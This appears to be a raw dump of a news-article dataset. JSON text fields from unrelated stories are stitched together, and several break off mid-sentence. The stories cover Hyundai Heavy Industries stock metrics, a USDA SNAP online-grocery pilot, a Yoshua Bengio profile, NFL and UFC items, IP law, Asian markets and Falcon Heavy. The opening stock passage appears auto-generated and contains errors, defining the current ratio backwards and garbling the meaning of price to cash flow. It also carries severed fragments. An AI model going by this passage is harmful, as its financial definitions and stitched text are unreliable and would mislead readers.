P/CF ratio indicates that the company is less capital demanding and the lesser price to cash flow indicates that the company is more capital demanding. \nFormula: Price to Cash Flow = Current Stock Price/ Cash Flow per Share \nThis ratio is calculated by dividing the market value of a company by cash from operating activities. Additionally, the price to earnings ratio is another popular way for analysts and investors to determine a company\u2019s profitability. The price to earnings ratio for Hyundai Heavy Industries Co., Ltd. (KOSE:A009540) is -17.351309. This ratio is found by taking the current share price and dividing by earnings per share. \nFurther, Price to Book ratio for Hyundai Heavy Industries Co., Ltd. KOSE:A009540 is 0.714161. A lower price to book ratio indicates that the stock might be undervalued. \nInvestors may be looking ahead to the next couple of quarters trying to gauge whether the bulls will stay in charge or if the bears will start to take over. Of course, nobody knows for sure which way the market will turn, but being ready for any situation can greatly help the investor prepare. Many investors will be trying to find that balance between being too aggressive and too conservative with stock selection. This can be a tricky aspect to address as there are so many different factors that can come into play. Studying the important pieces of economic data on a regular basis can help with crafting a legitimate hypothesis about where stocks will be in the future. \nIn taking a look at some additional key numbers, Hyundai Heavy Industries Co., Ltd. (KOSE:A009540) has a current ERP5 Rank of 11791. The ERP5 Rank may assist investors with spotting companies that are undervalued. This ranking uses four ratios. These ratios are Earnings Yield, ROIC, Price to Book, and 5 year average ROIC. When looking at the ERP5 ranking, it is generally considered the lower the value, the better. \nThe Gross Margin Score is calculated by looking at the Gross Margin and the overall stability of the company over the course of 8 years.

(KOSE:A009540) currently has a Montier C-score of 3.00000. This indicator was developed by James Montier in an attempt to identify firms that were fixing the books in order to appear better on paper. The score ranges from zero to six where a 0 would indicate no evidence of book cooking, and a 6 would indicate a high likelihood. A C-score of -1 would indicate that there is not enough information available to calculate the score. Montier used six inputs in the calculation. These inputs included a growing difference between net income and cash flow from operations, increasing receivable days, growing day\u2019s sales of inventory, increasing other current assets, decrease in depreciation relative to gross property plant and equipment, and high total asset growth. \nHyundai Heavy Industries Co., Ltd. (KOSE:A009540) has an M-score Beneish of -2.305815. This M-score model was developed by Messod Beneish in order to detect manipulation of financial statements. The score uses a combination of eight different variables. The specifics of the variables and formula can be found in the Beneish paper \u201cThe Detection of Earnings Manipulation\u201d. \nThe Value Composite One (VC1) is a method that investors use to determine a company\u2019s value. The VC1 of Hyundai Heavy Industries Co., Ltd. (KOSE:A009540) is 45. A company with a value of 0 is thought to be an undervalued company, while a company with a value of 100 is considered an overvalued company.

Typically, a stock scoring an 8 or 9 would be seen as strong. On the other end, a stock with a score from 0-2 would be viewed as weak. \nValuation \nHyundai Heavy Industries Co., Ltd. (KOSE:A009540) presently has a current ratio of 1.27. The current ratio, also known as the working capital ratio, is a liquidity ratio that displays the proportion of current assets of a business relative to the current liabilities. The ratio is simply calculated by dividing current liabilities by current assets. The ratio may be used to provide an idea of the ability of a certain company to pay back its liabilities with assets. Typically, the higher the current ratio the better, as the company may be more capable of paying back its obligations. \nThe Earnings to Price yield of Hyundai Heavy Industries Co., Ltd. KOSE:A009540 is -0.057633. This is calculated by taking the earnings per share and dividing it by the last closing share price.

(KOSE:A009540) is -0.053657. \nFree Cash Flow Growth (FCF Growth) is the free cash flow of the current year minus the free cash flow from the previous year, divided by last year\u2019s free cash flow. The FCF Growth of Hyundai Heavy Industries Co., Ltd. (KOSE:A009540) is -1.043308. Free cash flow (FCF) is the cash produced by the company minus capital expenditure. This cash is what a company uses to meet its financial obligations, such as making payments on debt or to pay out dividends.

The FCF Score of Hyundai Heavy Industries Co., Ltd. (KOSE:A009540) is -0.581579. Experts say the higher the value, the better, as it means that the free cash flow is high, or the variability of free cash flow is low or both. \nVolatility \nStock volatility is a percentage that indicates whether a stock is a desirable purchase. Investors look at the Volatility 12m to determine if a company has a low volatility percentage or not over the course of a year. The Volatility 12m of Hyundai Heavy Industries Co., Ltd. (KOSE:A009540) is 37.814300. This is calculated by taking weekly log normal returns and standard deviation of the share price over one year annualized. The lower the number, a company is thought to have low volatility. The Volatility 3m is a similar percentage determined by the daily log normal returns and standard deviation of the share price over 3 months. The Volatility 3m of Hyundai Heavy Industries Co., Ltd. (KOSE:A009540) is 38.418500. The Volatility 6m is the same, except measured over the course of six months.

They are also adept at controlling risk and properly managing the portfolio to extract maximum profit. These types of investors have most likely put in the required time and effort that it takes to understand the inner workings of the market. Expecting that profits will start rolling in immediately can lead to extreme disappointment down the line. Investors have to learn how to align goals and expectations in order to confidently navigate the market terrain.",

      "title": "USDA launches pilot program allowing SNAP recipients to shop for groceries online",
      "text": "The USDA this morning announced the launch of a pilot program that will open up online grocery shopping to those on public assistance. During a two-year pilot program, those receiving SNAP (Supplemental Nutrition Assistance Program) benefits \u2014 often referred to as \u201cfood stamps\u201d \u2014 will be able to shop for groceries from online retailers, including Walmart, Amazon, and soon, ShopRite and others. The pilot is live in New York state at launch, with availability that varies by retailer. \nAmazon\u2019s program will encompass the grocery and household selections available on both AmazonFresh and Prime Pantry , the retailer says , without the requirement of a membership fee. This program will operate only in the New York City area, as will ShopRite, when it joins the pilot next week. \nMeanwhile, Walmart\u2019s pilot will cover grocery pickup and delivery in upstate New York locations. \nThe USDA says other retailers are expected to join the pilot in the months ahead. Eventually, the program will also expand to other areas in New York and beyond, including Alabama, Iowa, Maryland, Nebraska, New Jersey, Oregon and Washington. \nPlans for the program have been in the works for years. The 2014 Farm Bill authorized the USDA to conduct and evaluate a pilot for online purchasing using SNAP, before rolling out support nationwide. During this pilot, the goal is to test that SNAP benefits are processed safely and securely, and to better understand the challenges involving online acceptance of SNAP. \nThis is also the first time that SNAP participants will be able to order grocery delivery online \u2014 something that the USDA believes should no longer be considered a luxury. \nAt times, online retailers can offer lower prices on items, which can benefit budget shoppers. Plus, not all online grocery items are marked up, versus what you can buy in store. That tends to be more true for fast delivery services like Instacart or Shipt. Walmart, for example, charges the same prices for its online groceries as it does in stores. And when free delivery is offered, SNAP recipients can save both time and gas. (SNAP will only cover food items, not delivery or other fees.) \nThese are all the same perks that any e-commerce shopper enjoys, but can be even better appreciated by those who don\u2019t have a car, can\u2019t afford gas, or work multiple jobs trying to make ends meet and don\u2019t have time to shop. \n\u201cPeople who receive SNAP benefits should have the opportunity to shop for food the same way more and more Americans shop for food \u2013 by ordering and paying for groceries online. As technology advances, it is important for SNAP to advance too, so we can ensure the same shopping options are available for both non-SNAP and SNAP recipients,\u201d said Secretary of Agriculture Sonny Perdue, in a statement. \u201cWe look forward to monitoring how these pilots increase food access and customer service to those we serve, specifically those who may experience challenges in visiting brick and mortar stores,\u201d he added. \nThe pilot program will involve the use of electronic benefit (EBT) cards issued by New York to allow for the online purchasing. Walmart and Amazon are live today, with ShopRite and others joining in the weeks ahead. \nAmazon says the program will \u201cdramatically increase access to food for more remote customers and help to mitigate the public health crisis of food deserts,\u201d \u2014 a reference to areas where it\u2019s difficult to find healthy food choices, which leads to Americans opting for convenience foods and fast foods instead. This, in turns, can lead to further health problems down the road. \nThe USDA today proclaimed this is the \u201cfirst time SNAP customers can pay for their groceries online.\u201d That\u2019s true, but comes with a caveat. In 2017, Walmart began EBT acceptance for groceries bought online starting in one store in the Houston market and four more in Boise. Its program supported SNAP and EBT Cash / TANF but not WIC. However, those customers could only order grocery pickup, not delivery. \nThe difference between that program and the USDA\u2019s program, Walmart clarified to TechCrunch, is that SNAP recipients would have to pay for their groceries at the pickup location by choosing \u201cPay at Pickup\u201d at checkout. Walmart wasn\u2019t actually processing the transactions online, but rather in a parking stall at the Walmart store. \nWalmart says it has since expanded that earlier SNAP at Pickup program to 40 stores across several states. For the USDA program, however, it has nearly 275 Grocery Pickup stores in the nine eligible states where the pilot is set to run. \n\u201cWe are excited to be part of the USDA\u2019s pilot program and to be able to make our Grocery Pickup and Delivery service available to more and more people, regardless of their payment method,\u201d a Walmart spokesperson said. \u201cAccess to convenience and to quality, fresh groceries shouldn\u2019t be dictated by how you pay. This pilot program is a great step forward and we are eager to expand this to customers in other states where we already have a great online grocery business.\u201d \nAmazon has also rolled out support to those on public assistance before today. \nIn 2017, it launched a low-cost version of Prime for U.S. customers with a valid EBT card, and later followed by offering low-cost Prime to Medicaid recipients last year. \nOther retailers who were selected for the USDA pilot include Dash\u2019s Market, FreshDirect, Hy-Vee, Safeway, and Wright\u2019s Markets. They are not yet live.",

      "text": "MONTREAL \u2014 Yoshua Bengio is worried that innovations in artificial intelligence that he helped pioneer could lead to a dark future, if \u201ckiller robots\u201d get into the wrong hands. \nBut the soft-spoken, 55-year-old Canadian computer scientist, a recipient of this year\u2019s A.M. Turing Award \u2014 considered the Nobel Prize for computing \u2014 prefers to see the world though the idealism of \u201cStar Trek\u201d rather than the apocalyptic vision of \u201cThe Terminator.\u201d \n\u201cIn \u2018Star Trek,\u2019 there is a world in which humans are governed through democracy, everyone gets good health care, education and food, and there are no wars except against some aliens,\u201d said Dr. Bengio, whose research has helped pave the way for speech- and facial-recognition technology, computer vision and self-driving cars, among other things. \u201cI am also trying to marry science with how it can improve society.\u201d \nDr. Bengio was expounding on the promises \u2014 and perils \u2014 of A.I. on a recent day while sitting in his small, cramped office at the Montreal Institute for Learning Algorithms, a research center he founded that has made Montreal a global center for artificial intelligence. Next to him was a whiteboard covered with complex mathematical equations, along with a warning for the cleaners written in French: \u201cDo Not Erase.\u201d \nErasing those equations could come at a heavy cost for humans as well as machines. \nDr. Bengio, a professor of computer science at the University of Montreal , is self-effacing. But his work in an area known as deep learning \u2014 \u201cteaching machines to learn in a way inspired by how our brains compute,\u201d he says \u2014 has already affected our daily lives in countless ways, making it possible for Google Translate to convert a sentence from French to Mandarin or for software to detect cancer cells in a medical image. \nHe and his researchers are also harnessing A.I. to discover molecules that could cure diseases, to detect gender bias in textbooks and to predict when natural disasters will happen. \nCherri M. Pancake, the president of the Association for Computing Machinery , which offers the $1 million award, credited Dr. Bengio and two other luminaries who shared the prize, Geoffrey Hinton and Yann LeCun , with laying the foundation for technologies used by billions of people. \u201cAnyone who has a smartphone in their pocket\u201d has felt their impact, she said, noting that their work also provided \u201cpowerful new tools\u201d in the fields of medicine, astronomy and material sciences. \nDespite all the accolades, Dr. Bengio recoils at scientists being turned into celebrities. While Dr. Hinton works for Google and Dr. LeCun is the chief A.I. scientist at Facebook, Dr. Bengio has studiously avoided Silicon Valley in favor of a more scholarly life in Montreal, where he also co-founded Element A.I., a software company. \n\u201cI\u2019m not a fan of a personalization of science and making some scientists stars,\u201d said Dr. Bengio, a self-described introvert, who colleagues say is happiest when hunched over an algorithm. \u201cI was maybe lucky to be at the right time and thinking the right things.\u201d \nMyriam C\u00f4t\u00e9 , a computer scientist who has worked with Dr. Bengio for more than a decade, described him as an iconoclast and freethinker who would feel stymied by the strictures of Silicon Valley. A communitarian at heart, she said, he shuns hierarchy and is known for sharing the profits from his own projects with younger, less established colleagues. \n\u201cHe wants to create in freedom,\u201d she said. Citing the credo of student rebels in 1968 in Paris, where Dr. Bengio was born, she said his philosophy was: \u201cIt is forbidden to forbid.\u201d \nThat, in turn, has informed his approach to A.I. \nEven as Stephen Hawking, the celebrated Cambridge physicist, warned that A.I. could be \u201cthe worst event in the history of our civilization,\u201d and the billionaire entrepreneur Elon Musk has cautioned it could create an \u201cimmortal dictator,\u201d Dr. Bengio has remained more upbeat. \n\u201cWe need to pursue scientific knowledge, or all we will do is run against a wall,\u201d he said. \u201cBut we need to do it wisely.\u201d Referring to the use of algebra to compute the angles of missiles, he added: \u201cYou can\u2019t blame the inventor of algebra for war.\u201d \nNevertheless, at a time when Facebook algorithms have come under criticism for their influence in the 2016 United States election and fears are growing that robots could use A.I. to target humans without human oversight, Dr. Bengio is acutely aware that his innovations risk becoming \u201cFrankenstein\u2019s monsters.\u201d As a result, he said, he supports regulating A.I., including an international treaty banning \u201ckiller robots\u201d or \u201clethal autonomous weapons.\u201d \nBut he dismissed the \u201cTerminator scenario\u201d in which a machine, endowed with human emotions, turns on its creator. Machines, he stressed, do not have egos and human sentiments, and are not slaves who want to be freed. \u201cWe imagine our creations turning against us because we are projecting our psychology into the machines,\u201d he said, calling it \u201cridiculous.\u201d \nThe son of Sephardic Jews from Casablanca, Morocco, who emigrated to Paris in the 1960s, Dr. Bengio traced his interest in A.I. to his childhood, when he hungrily devoured the science fiction books of Isaac Asimov , Ray Bradbury and Arthur C. Clarke . \nHe said his imagination was particularly kindled by the relationship between man and machine in Stanley Kubrick\u2019s \u201c2001: A Space Odyssey.\u201d \u201cA teacher who spends every day teaching a machine about the world resonated with me,\u201d he said. \u201cScience fiction was a way to dream about the future.\u201d \nAt the age of 11, he recalled, he began programming by plugging numbers into a calculator. Asked to recall the most formative memories from childhood, he suddenly paused and made an unlikely confession. \n\u201cI don\u2019t have a good memory \u2014 I\u2019m good at reasoning, not at memory. That\u2019s why I was drawn to math and computer science, as you don\u2019t need to memorize anything.\u201d \nDr. Bengio attributed his success to his socially conscious parents, noting that his father, a pharmacist who directed theater, and his mother, who managed artists, gave him and his brother the freedom to think for themselves. \nIt appears to have worked. His brother , Samy, one year younger, runs a research group at Google Brain, an A.I. research team. The two were \u201cpractically twins,\u201d he said, collaborating on research and exchanging ideas. \nWhen he was 12, the family moved to Montreal, where his maternal grandparents were living. While pursuing his masters and doctorate in computer science at McGill University in the late 1980s, he recalled, he was drawn to the work of Dr. Hinton, who was striving to develop \u201cintelligent computers\u201d based on so-called neural networks, mathematical algorithms that can learn tasks on their own by analyzing vast swathes of data. \n\u201cIt wasn\u2019t just some mathy thing or computer science, but about understanding human intelligence to build intelligent machines,\u201d he said. Postdoctoral work at the Massachusetts Institute of Technology and Bell Labs followed. \nDr. Bengio noted that he, Dr. Hinton and Dr. LeCun labored on neural networks for decades, even as many in the computer science establishment dismissed them as dabblers in a form of dark magic with few, if any, practical applications. For Dr. Bengio, bucking conventional wisdom came naturally. \n\u201cThe big dreams of building intelligent machines faded in the late \u201990s and people thought, \u2018Oh, it\u2019s too hard \u2014 let\u2019s just use our algorithms to solve concrete problems,\u2019\u201d he recalled. \u201cI guess I am not sensitive to what people care about at a particular time, and I believed in what I was doing.\u201d \nWhile their trailblazing work transformed the field \u2014 and turned him into an A.I. superstar \u2014 Dr. Bengio still delights in spending time with students, whom he describes as a \u201cfamily.\u201d He is divorced and has two grown children, one of whom has gone into A.I. He spends his rare free moments reading Spinoza and walking in the woods near his house. \nUnimpressed by scientific prizes or riches, Dr. Bengio stressed that complacency and overconfidence were the enemies of scientific progress. \n\u201cBeing self-confident is not enough,\u201d he said. \u201cYou can be self-confident and wrong.\u201d",

Those possibilities may be part of the reason for one pre-draft meeting the Eagles are taking on Tuesday. \nMike Garafolo of NFL Media reports that former Houston defensive lineman Ed Oliver is visiting with the team. The Eagles currently own the 25th overall pick and Oliver is generally expected to be wearing the cap of another team by the time that pick comes around, but they\u2019ll be ready should things wind up playing out differently. \nGarafolo adds that the Eagles are also meeting with former Ohio State wide receiver Paris Campbell. He\u2019s likely to be available at No. 25 and the Eagles hold a pair of second-round picks that could be used to round out the receiver group.",

      "text": "Brandon Copeland \nNFL player Brandon Copeland saves nearly all of his income. According to Spotrac , his NFL salary is a reported $1.2 million. \nCopeland said that for him, saving isn't about how much he earns \u2014 it's about how much he spends. \nThe New York Jets linebacker has a Wall Street background, runs his own real-estate business, and teaches a financial-literacy class at UPenn. \nNFL player Brandon Copeland knows a thing or two about saving money. \nThe New York Jets linebacker told Business Insider he saves almost all of his salary \u2014 according to Spotrac , his NFL salary is a reported $1.2 million. \nThat's not to mention his numerous side hustles, which include running his own real-estate company with his wife and teaching a financial-literacy class he nicknamed \"Life 101\" at his alma mater, The University of Pennsylvania, with Brian Peterson . \nAccording to Copeland, saving money starts with tracking your expenses \u2014 how much you can save all comes down to how much you're spending. \n\"Keep income out of it as long as you can,\" he said. \"For me personally, it's not about the income I make, it's about what I'm spending and what can be cut.\" \nHe continued: \"I ask myself, 'Is this the lifestyle I really need to be living? Do I really need to spend $14.99 a month for Spotify without commercials?' You don't need to [involve] income to think of these things.\" \nWhat one spends on depends on what they value, Copeland added. For him, that's experiences like taking a trip with his wife. He said he doesn't need certain things and resists upgrades, like driving a Corvette to training \u2014 he'd rather take the Ford Focus. \nRegardless of income level, many millionaires and billionaires cut back on what they spend \u2014 it's what helps them build wealth, according to Sarah Stanley Fallaw, the director of research for the Affluent Market Institute and an author of \" The Next Millionaire Next Door: Enduring Strategies for Building Wealth ,\" in which she surveyed more than 600 millionaires in America. \nShe found that frugality \u2014 a commitment to saving, spending less, and sticking to a budget \u2014 is one of the characteristics most predictive of net worth. \n\"Spending above your means, spending instead of saving for retirement, spending in anticipation of becoming wealthy makes you a slave to the paycheck, even with a stellar level of income,\" she wrote. \nConsider Richard Branson , who resists buying luxury items. Meanwhile, the famously frugal Warren Buffett still lives in the modest home in Omaha, Nebraska, that he bought for $276,700 in 1958 (in today's dollars). He's never upgraded to a smartphone, pays $18 for a haircut, and spends no more than $3.17 on his daily McDonald's breakfast. \nAnd, like Copeland, Mark Zuckerberg and Jeff Bezos have shown a preference for affordable cars \u2014 Hondas, to be precise.

We do not agree with the allegations. The Astros will continue to use fan popular T-shirt launchers during games. As this is an ongoing legal matter, we will have no further comment on this matter.\u201d \nThe Chronicle reported court records said Harughty was seated in the middle of the first deck behind the third base line when the incident occurred. The lawsuit said the fracture required two surgeries to repair. \nThe newspaper reported court records said two screws were placed in her finger to repair the break and that she needed to attend physical therapy two times a week after the surgery. The suit added she \u201ccontinued to suffer pain, swelling and loss of range of motion.\u201d Her second surgery was performed in October and Harughty\u2019s lawsuit says that her finger still isn\u2019t right and \u201cremains locked in an extended position with little to no range of motion.\u201d \nThe lawsuit alleged the Astros were negligent in not using reasonable care in the firing of the T-shirt cannon and that they failed to provide warnings to fans about the risk the cannons pose and not properly supervising staff to ensure the safety of fans. \nWas this article valuable? \nHere are more articles you may enjoy. \nWant to stay up to date? \nGet the latest insurance news \nsent straight to your inbox.",

      "title": "Protecting the Secret Sauce: What You Need to Know About Intellectual Property (IP)",
      "text": "Intellectual property (IP) rights may apply to a multitude of things, from corporate branding names and new inventions to product designs and secret recipes. Do you have a secret sauce whether a novel or a novel idea? How is your secret sauce best protected? \nTypes of Intellectual Property (IP) \nIn the US, intellectual property rights violation awards can reach eight figures. ( Business Insurance ) \nThere are four main types of IP rights. Which one to choose to protect your IP depends on what you are protecting: a slogan for your business, your granny\u2019s recipe for pop tarts or a new operating system. \nA trade secret may be a recipe, formula, technique or process you don\u2019t want anyone to know about. According to commercial law firm Lewis Roca Rothgerber Christie LLP , there are two types. The first are secrets that for some reason don\u2019t fulfill the criteria for being patented, e.g. they aren\u2019t inventive enough. The second are secrets so hush-hush, an inventor does not wish to patent them. One of the main reasons an inventor would choose to keep an invention a trade secret is because patents expire, trade secrets don\u2019t. The classic example is Coca-Cola , which is not patented. If it had been at the time of its invention in 1886, the formula would have been in the public domain 20 years\u2019 later, as patents are time limited. \nAccording to The Hustle , in 2007, three Coca-Cola workers were sent to prison for offering Pepsi insider information about a new Coca-Cola product. They were indicted for wire fraud and conspiracy to sell trade secrets. The trio received sentences between five and eight years, and had to pay restitution. The most interesting thing about this case was that it was Pepsi who tipped Coca-Cola off about being offered insider information. \nProtects against the exploitation or use of a new or innovative invention, like an idea or product, for a period of 20 years. In exchange, the inventor must make full disclosure of their invention. When the patent expires, the information can be used by anyone. In a competitive industry like technology or medicine, an organization would prefer to patent their invention before their competitor (working on a similar product) does. In the pharmaceutical world, drug companies use the technique of evergreening to extend the life of their medical patents, e.g. by patenting modifications. An average of 3500 patents are published weekly in the US. \nAmazon in 1999 challenged Barnes and Noble for copying its 1-click purchase technology, for which it had a patent. The case was settled out of court in 2002. Amazon\u2019s patent has since expired and the 1-click concept now has its own entry in Wikipedia . Variations on 1-click payments are used by PayPal, eBay and PayPal. \nEssentially branding collateral, e.g. logo, name, lyrics, colors. A classic example is the Nike checkmark. A trademark allows you to use the registered trademark symbol. \nTwitter was unable to trademark the word \u201ctweet\u201d as another company, Twittad, had already trademarked \u201clet your ad meet tweets\u201d. So, Twitter went to court, claiming it had been using the word \u201ctweet\u201d long before Twittad. The courts didn\u2019t agree. The two companies eventually settled their differences out of court and in 2011, Twittad subsequently transferred the registration of the \u201ctweet\u201d trademark to Twitter. \nCopyright (United States Copyright Office) \nAutomatically protects authors of intellectual works, e.g. literary, music, sculptural, computer software and images. \nNapster \u2013 a file-sharing site \u2013 was sued by the Recording Industry Association of America (RIAA) for allowing users to download files for which Napster did not have copyright.

      "text": "* Forecast cut for trade and economic growth hampers sentiment * Malaysia posts second straight session of gains * Philippines, Vietnam, Thai markets rangebound By Shreya Mariam Job April 3 (Reuters) - Most Southeast Asian markets ended flat on Wednesday after the World Trade Organization cut its 2019 trade growth estimate and the Asian Development Bank trimmed regional economic growth forecast, while Singapore closed at a near eight-month high. World trade shrank by 0.3 percent in the fourth quarter of 2018 and is likely to grow by 2.6 percent this year, below a previous forecast of 3.7 percent, the World Trade Organization said. This year's growth forecast for Southeast Asia was trimmed to 4.9 percent from an earlier estimate of 5.1 percent, as the Manila-based lender Asian Development Bank expects Malaysia, Singapore, Philippines and Thailand to grow slower than previously estimated. Singapore stocks, however, shrugged off worries of a soft growth forecast as local lenders boosted the index by 1 percent to its highest close since Aug. 9, 2018. \"Local catalysts for Singapore financials are the rising SIBOR (Singapore Interbank Offered Rate) and resilient loans growth. Both will be supportive for bank earnings this year,\" said Paul Chew, head of research, Phillip Securities Research. Ongoing loans repricing for non-corporate loans continue as repricing typically lags movements in SIBOR, making the banks privy to wider margins in that period, Lim Rui Wen, an equity research analyst in DBS Bank, said in a note. The dividend yields of about 4.1 to 4.7 percent also supported the valuations of the banks, the analyst added. The city-state's top-listed lenders DBS Group Holdings , Oversea-Chinese Banking Corp and United Overseas Bank Ltd jumped between 1.4 percent and 2.5 percent. Malaysian stocks ended 0.6 percent higher, posting their second consecutive session of gains on the back of healthcare and financials. IHH Healthcare Bhd and Public Bank Bhd climbed 3.3 percent and 1.3 percent, respectively. The Indonesian stock market was closed for a holiday, while Philippines, Vietnam and Thai indexes were rangebound.

      "text": "Demand for the humble uninterruptible power supply is strong, but electric cars are making it hard for the channel to satisfy buyers. \nThat\u2019s the opinion of Herve Tardy, Eaton\u2019s vice president and general manager for distributed power infrastructure. \nTardy told CRN the demand for new uninterruptible power supplies (UPSes) comes from the availability of new models that use Lithium-Ion (Li-ion) batteries. Such devices can last for almost a decade, compared to the two or three year lifecycle of a lead-acid battery. While Li-ion-powered devices are more expensive to acquire, their long-term total cost of ownership beats other battery technologies. A longer working life for a UPS also means less work swapping them in and out. \nBut the UPS industry is not alone in recognising Li-ion batteries\u2019 many fine qualities: they\u2019re also essential to the burgeoning electric car market. And that market, Tardy told CRN, has attracted rather more investment than the UPS. \n\u201cThe Li-ion battery market for UPS is a niche of a niche of a niche,\u201d Tardy said. \u201cWhen you knock on the door of a manufacturer, they laugh.\u201d \nWhile smaller suppliers were keen, Tardy said the quality on offer has not always been great. \nThat\u2019s made trouble for Eaton because Tardy said \u201cwe had been pitching large Li-ions for large UPS and we were unable to satisfy they demand because we could not get the batteries.\u201d \nTardy said Eaton has therefore spent a lot of time in Korea working with Li-ion battery-makers, and after explaining the opportunity has been able to secure a steady supply of batteries in the smaller sizes that make for good UPSes. \nThe burgeoning demand for electric cars also helps the UPS industry, he added, because some UPSes do need car-sized Li-ions.",

      "text": "The man who has asked the UFC commentators to refer to him as \u201cThe Korean Zombie\u201d fights in the main event of Saturday\u2019s UFC Fight Night 165. That man\u2019s given name is Chan Sung Jung, and he is a finisher. Jung has gone the distance four times in his MMA career. All four of those fights came before he joined the UFC in 2011. Jung\u2019s most recent bout that went to the final horn was is WEC 48 scrap against Leonard Garcia. The fight ended with Garcia winning a split decision victory. \nJung, who battled Jose Aldo for the featherweight title in August 2013, faces former lightweight champion Frankie Edger in the main event of Saturday\u2019s fight card. It\u2019s safe to assume that Jung will want to be on the giving end of any stoppage that takes place since the fight card takes place in his home country of South Korea. \nJung\u2019s record with the UFC is 5-2. Of his five wins with the promotion, three have come by knockout and two by way of submission. His most recent victory was a 58-second knockout win over Renato Moicano in June of this year. Like all but one of Jung\u2019s UFC bouts \u2014 win or lose \u2013 he earned a post-fight bonus for that stoppage. \nJung set the tone for his UFC run in his first fight with the promotion. In his March 2011 rematch against Leonard Garcia, Jung scored the first twister submission in UFC history. He followed that with a December 2011 7-second knockout victory over Mark Hominick. Since then, Jung has gone 3-2. Included in his career is a break of more than three years. During that time away from the cage, Jung served his mandatory military service. When he returned to action in 2017, Jung knocked out Dennis Bermudez in 2:49. \nBefore Jung faces Edgar on Saturday, please take a look at some of his best finishes below. \nUFC Fight Night 165 takes place Saturday at Sajik Arena in Busan, South Korea. The main card airs on ESPN+ following prelims on ESPN. \nMORE FROM UFC FIGHT NIGHT 165:",

      "text": "Hospitality start-up RedDoorz has raised US$70 million (S$97 million) in its ongoing Series C funding round, the company announced yesterday. \nThis injection of funds follows the Singapore-based budget hotel management and booking platform's US$45 million Series B round, which closed in April. The firm has raised around US$140 million to date. \nA significant portion of the latest funds raised will be used to build a second technology hub in Vietnam, which will complement RedDoorz's current regional tech hub in India. It also intends to ramp up its hotel staff and quality training programmes across its properties. \nThe funds will also be used to improve the brand's presence in its existing markets, RedDoorz founder and chief executive Amit Saberwal told The Straits Times yesterday. \nVietnam is the company's newest market, having entered the country in July last year, and accounts for about 10 per cent of its business, he said. The new hub in Vietnam will be its Asean hub, which will allow the company to localise its business further. \nDeveloping the firm's technology, which includes artificial intelligence-based pricing engines, is paramount to the company's continued development, since the budget hospitality space cannot be a people-dependent business, he added. \nThe start-up's Series C round was led by Singapore-based growth equity investment firm Asia Partners, which was launched in June. \nOther participants included new investors Rakuten Capital, the corporate venture arm of Japanese giant Rakuten Group, and the Mirae Asset-Naver Asia Growth Fund, a joint venture between Seoul-based Mirae Financial Group and Internet giant Naver Corporation. \nExisting investors Qiming Venture Partners and World Bank Group's private investment arm, International Finance Corporation, were also on board the financing round. \nMr Saberwal said the company is looking at countries such as Thailand and Malaysia to move into, adding: \"All of South-east Asia is our playground\". \nIt is unlikely that the company will move into Europe or China as it is not familiar with these markets, he said. \"You have to understand your market, know where you can play, and that's part of our secret sauce.\" \nWhile the company is not profitable at this point, Mr Saberwal said: \"This is not the time to look at profit stability, this is the time to look at growth, but we've always been within touching distance of profitability.\" \nHe believes the company's execution has been the key factor in its growth thus far. \"We are not building a business on an airy-fairy concept, we are building it based on a real operational problem and executing towards that.\" \nRedDoorz is the first company in the portfolio of Asia Partners, whose co-founders include gaming and e-commerce firm Sea's former group president Nicholas Nash and Mr Oliver Rippel, a former senior executive of South Africa-headquartered Internet firm and technology investor Naspers. \nFounded in 2015, RedDoorz currently operates in 80 cities across Indonesia, Singapore, Vietnam and the Philippines. Apart from operating a budget hotel booking platform, it directly runs and leases hotels. Its investors include 500 Startups, Jungle Ventures and Susquehanna International Group's Asia Investment Fund.",

      "title": "SpaceX reveals Falcon Heavy Block 5 in first official photo, timelapse",
      "text": "SpaceX has revealed the first official media (including a timelapse video) of its Falcon Heavy Block 5 rocket, including one of the most spectacular photos of Falcon Heavy (and the Falcon family in general, for that matter) ever. \nOver a period of 24-48 hours in early April, SpaceX technicians and engineers completed Falcon Heavy Flight 2\u2019s final integration, attaching the side boosters to the center core and the rocket\u2019s upper stage to its interstage. After assembled, cranes lifted the massive rocket \u2013 likely weighing upwards of 75 metric tons (165,000 lb) \u2013 and carefully installed it on Pad 39A\u2019s transporter/erector (T/E), a large mobile structure that houses hold-down clamps and fueling/communications hardware, as well as the ability to lift the rocket vertical and horizontal. Soon after, the rocket rolled out to Pad 39A and performed its first integrated static fire, paving the way for a launch date as early as 6:35 pm EDT (22:35 UTC), April 9th. \nAlongside the unique timelapse of Falcon Heavy\u2019s second-ever final integration, SpaceX also released one of the best Falcon (9 or Heavy) photos ever \u2013 a 4K view of all 27 of Falcon Heavy\u2019s Merlin 1D engines, altogether capable of producing more than 5.6 million pounds (2550 metric tons, 25,000 kN) of thrust. \nAlso in the hangar is the Falcon 9 first stage booster that launched Crew Dragon to the @Space_Station last month \n\u2014 SpaceX (@SpaceX) April 7, 2019 \nOffered in 4K resolution, the photo is perhaps the most detailed official look yet at a Block 5 rocket, particularly so for a view of the engine section, octaweb, and heat shielding of not one but four boosters. Immediately noticeable is an intriguing green patina present on each Falcon Heavy booster\u2019s shield heat shield structure, sometimes described (humorously) as the dance floor. Prior to these three boosters, the same structure of other Falcon 9 Block 5 boosters has never featured the same patina, indicating that it is either a distinct modification (improved shielding, perhaps) or \u2013 more likely \u2013 a vestige of manufacturing that disappears during each Block 5 booster\u2019s first high-speed reentry. In other words, it might be a patina or an anti-corrosion coating that is literally burned off in the process of landing. \nAdditionally, the complex mechanisms connecting the three Falcon 9-like boosters are also easily visible. Rough visual comparisons between the mechanisms present on Falcon Heavy Flight 1 and 2 suggest that they are largely unchanged. Their ultimate job is to safely, reliably, and repeatedly transfer truly horrifying loads \u2013 at times, the majority of the thrust of both side boosters \u2013 with as little mass and aerodynamic disruption as possible, all while still successfully separating the three boosters and retracting thereafter. In a press conference shortly after Falcon Heavy\u2019s successful launch debut, Musk repeatedly acknowledged that the additional hardware required \u2013 aside from a complete redesign for the center core \u2013 was an extraordinary engineering challenge, far harder than he had expected it would be. \nAdditionally, SpaceX confirmed that the fourth booster present inside 39A\u2019s main hangar was Falcon 9 B1051, the same rocket that launched Crew Dragon into orbit for the first time one month ago. According to the Canadian Space Agency (CSA), B1051 is being refurbished for its Radarsat Constellation Mission (RCM), a trio of satellites planned to launch from Vandenberg Air Force Base (VAFB) no earlier than May 2019. Over the course of the Falcon Heavy integration timelapse, B1051 can be seen rotating on its rocket rotisserie as technicians work to rapidly turn the rocket around for its second launch. \nCheck out Teslarati\u2019s newsletters for prompt updates, on-the-ground perspectives, and unique glimpses of SpaceX\u2019s rocket 